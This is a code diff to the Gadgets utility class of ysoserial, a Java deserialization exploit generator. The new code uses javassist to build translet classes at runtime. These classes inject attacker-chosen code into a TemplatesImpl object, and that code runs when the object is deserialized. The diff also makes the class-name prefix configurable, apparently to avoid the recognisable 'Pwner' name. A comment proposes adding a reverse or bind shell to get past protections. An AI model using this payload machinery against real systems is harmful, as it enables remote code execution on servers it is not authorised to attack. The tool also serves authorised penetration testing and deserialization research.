@@ -1,35 +1,23 @@
 package ysoserial.payloads.util;
 
 
-import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.Modifier;
+import javassist.*;
+import ysoserial.Strings;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.InputStream;
 import java.io.Serializable;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
 import java.util.*;
 import java.util.jar.JarEntry;
 import java.util.jar.JarFile;
 
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-import org.apache.commons.collections.functors.InstantiateTransformer;
-import org.apache.xalan.xsltc.trax.TrAXFilter;
-import ysoserial.Strings;
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
 
 /*
@@ -50,27 +38,24 @@ public class Gadgets {
 
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
 
-    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
+    private static String CLASS_PREFIX;
 
-        private static final long serialVersionUID = -5971610431559700674L;
-
-
-        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
-
-
-        @Override
-        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
+    static {
+        String classPrefix = System.getProperty("ysoserial.class_prefix", "javax.objects.Object");
+        if(classPrefix.startsWith("java.")) {
+            System.err.println("Error: cannot use the 'java' internal and sealed package for 'ysoserial.class_prefix'.");
+            System.exit(1);
+        }
+        CLASS_PREFIX = classPrefix;
     }
 
-    // required to make TemplatesImpl happy
-    public static class Foo implements Serializable {
-
-        private static final long serialVersionUID = 8207363842866235160L;
+    public static void overrideClassPrefix(String prefix) {
+        CLASS_PREFIX = prefix;
     }
 
     public static String generateRandomClassName() {
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        return "ysoserial.Pwner" + System.nanoTime();
+        return CLASS_PREFIX + System.nanoTime();
     }
 
     public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
@@ -187,29 +172,48 @@ public class Gadgets {
 
         // use template gadget class
         ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
         pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        final CtClass clazz = pool.makeClass(generateRandomClassName());
+
+        clazz.setInterfaces(new CtClass[] {
+            pool.get(Serializable.class.getName())
+        });
+        clazz.setSuperclass(pool.get(abstTranslet.getName()));
+
+        CtField serialVersionUID = new CtField(CtClass.longType, "serialVersionUID", clazz);
+        serialVersionUID.setModifiers(Modifier.STATIC | Modifier.FINAL | Modifier.PRIVATE);
+        clazz.addField(serialVersionUID, String.valueOf(-5971610431559700674L));
+
         // set custom Java code block in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
         clazz.makeClassInitializer().insertAfter(inlineCode);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName(generateRandomClassName());
-        CtClass superC = pool.get(abstTranslet.getName());
-        clazz.setSuperclass(superC);
 
-        clazz.getConstructors()[0].setBody("this.namesArray = new String[0];");
+        // avoid raising exceptions
+        clazz.addConstructor(CtNewConstructor.make(new CtClass[0], new CtClass[0],
+                "this.namesArray = new String[0];", clazz));
 
         final byte[][] bytecodes = new byte[extraClasses.length + 2][];
         System.arraycopy(extraClasses, 0, bytecodes, 0, extraClasses.length);
         bytecodes[bytecodes.length - 2] = clazz.toBytecode();
-        bytecodes[bytecodes.length - 1] = ClassFiles.classAsBytes(Gadgets.Foo.class);
+
+        CtClass serializableClass = pool.makeClass(CLASS_PREFIX + ".Serial");
+        serializableClass.setInterfaces(new CtClass[] {
+            pool.get(Serializable.class.getName())
+        });
+        serialVersionUID = new CtField(CtClass.longType, "serialVersionUID", serializableClass);
+        serialVersionUID.setModifiers(Modifier.STATIC | Modifier.FINAL | Modifier.PRIVATE);
+        serializableClass.addField(serialVersionUID, String.valueOf(8207363842866235160L));
+
+        // required to make TemplatesImpl happy
+        bytecodes[bytecodes.length - 1] = serializableClass.toBytecode();
 
         // inject class bytes into instance
         Reflections.setFieldValue(templates, "_bytecodes", bytecodes);
 
         // required to make TemplatesImpl happy
-        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_name", generateRandomClassName());
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
